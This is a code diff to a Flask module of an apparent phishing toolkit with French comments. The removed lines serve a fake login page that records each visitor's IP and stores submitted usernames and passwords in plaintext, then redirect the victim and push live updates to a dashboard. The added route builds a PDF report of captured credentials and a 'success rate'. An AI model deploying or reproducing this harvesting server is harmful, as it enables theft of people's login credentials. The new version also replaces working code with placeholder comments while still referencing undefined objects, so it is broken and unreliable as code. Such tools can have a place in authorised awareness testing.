@@ -1,98 +1,48 @@
-from flask import Flask, render_template_string, request, redirect, render_template, jsonify
-from flask_socketio import SocketIO
-from .models import db, Campaign, Event  # Importe les modèles
-import os
-from datetime import datetime
-import threading
+# ... (importations existantes) ...
+from flask import make_response
+from weasyprint import HTML, CSS
+from .models import db, Campaign, Event
 
-socketio = SocketIO()
+# ... (la fonction create_app et les autres routes restent les mêmes) ...
 
 def create_app(config):
-    app = Flask(__name__, template_folder=os.path.abspath('templates'))
-    app.config['SECRET_KEY'] = 'humanghost-secret-key!'
-    # Configuration de la base de données SQLite
-    app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///humanghost.db'
-    app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
+    # ... (le début de la fonction create_app reste identique) ...
+    # ... (les routes '/', '/login', '/dashboard', '/api/campaign/<id>/events' ne changent pas) ...
 
-    # Lie l'instance de la base de données à l'application
-    db.init_app(app)
-
-    with app.app_context():
-        # Crée les tables si elles n'existent pas
-        db.create_all()
-
-        # Crée une nouvelle campagne à chaque lancement du serveur (pour la démo)
-        # Dans une version plus avancée, on la gérerait via la CLI
-        current_campaign = Campaign(name=config.get('name', 'Campagne sans nom'))
-        db.session.add(current_campaign)
-        db.session.commit()
-        app.config['CAMPAIGN_ID'] = current_campaign.id
-
-    @app.route("/")
-    def index():
-        campaign_id = app.config['CAMPAIGN_ID']
-        new_event = Event(
-            campaign_id=campaign_id,
-            ip_address=request.remote_addr,
-            event_type='Visit'
-        )
-        db.session.add(new_event)
-        db.session.commit()
-        socketio.emit('update', new_event_to_dict(new_event))
+    @app.route("/report/campaign/<int:campaign_id>")
+    def download_report(campaign_id):
+        """
+        Génère et sert un rapport PDF pour une campagne donnée.
+        """
+        campaign = Campaign.query.get_or_404(campaign_id)
+        events = Event.query.filter_by(campaign_id=campaign_id).order_by(Event.timestamp.asc()).all()
         
-        with open(os.path.join(app.template_folder, config['server']['template']), "r") as f:
-            return render_template_string(f.read())
-
-    @app.route("/login", methods=['POST'])
-    def login():
-        campaign_id = app.config['CAMPAIGN_ID']
-        username = request.form.get('username')
-        password = request.form.get('password')
+        # Calcul des statistiques
+        visits = sum(1 for e in events if e.event_type == 'Visit')
+        credentials_captured = sum(1 for e in events if e.event_type == 'Credential Submission')
+        success_rate = (credentials_captured / visits) if visits > 0 else 0
         
-        new_event = Event(
-            campaign_id=campaign_id,
-            ip_address=request.remote_addr,
-            event_type='Credential Submission',
-            details=f"Username: {username}, Password: {password}"
-        )
-        db.session.add(new_event)
-        db.session.commit()
-        socketio.emit('update', new_event_to_dict(new_event))
-            
-        return redirect(config['server']['redirect_url'])
+        stats = {
+            'total_events': len(events),
+            'visits': visits,
+            'credentials_captured': credentials_captured,
+            'success_rate': success_rate
+        }
 
-    @app.route("/dashboard")
-    def dashboard():
-        # Le tableau de bord affiche maintenant toutes les campagnes
-        campaigns = Campaign.query.order_by(Campaign.created_at.desc()).all()
-        return render_template("dashboard.html", campaigns=campaigns)
+        # Rendu du template HTML
+        html_string = render_template("report_template.html", campaign=campaign, events=events, stats=stats)
         
-    @app.route("/api/campaign/<int:campaign_id>/events")
-    def get_events(campaign_id):
-        # API pour que le tableau de bord récupère les événements d'une campagne
-        events = Event.query.filter_by(campaign_id=campaign_id).order_by(Event.timestamp.desc()).all()
-        return jsonify([new_event_to_dict(e) for e in events])
+        # Génération du PDF
+        pdf = HTML(string=html_string).write_pdf()
+        
+        # Création de la réponse HTTP
+        response = make_response(pdf)
+        response.headers['Content-Type'] = 'application/pdf'
+        response.headers['Content-Disposition'] = f'attachment; filename=rapport_campagne_{campaign_id}.pdf'
+        
+        return response
 
     socketio.init_app(app)
     return app
 
-def new_event_to_dict(event):
-    """Utilitaire pour convertir un objet Event en dictionnaire."""
-    return {
-        'timestamp': event.timestamp.strftime('%Y-%m-%d %H:%M:%S'),
-        'type': 'credential' if 'Credential' in event.event_type else 'event',
-        'event': event.event_type,
-        'details': event.details or f"IP: {event.ip_address}"
-    }
-
-# La fonction run_server_in_thread ne change pas
-def run_server_in_thread(config):
-    app = create_app(config)
-    host = config['server'].get('host', '0.0.0.0')
-    port = config['server'].get('port', 5000)
-    print(f"[*] Faux site accessible sur http://{host}:{port}")
-    print(f"[*] Tableau de bord accessible sur http://{host}:{port}/dashboard")
-    server_thread = threading.Thread(target=socketio.run, args=(app,), kwargs={'host': host, 'port': port, 'allow_unsafe_werkzeug': True})
-    server_thread.daemon = True
-    server_thread.start()
-    return server_thread
+# ... (les autres fonctions du fichier ne changent pas) ...
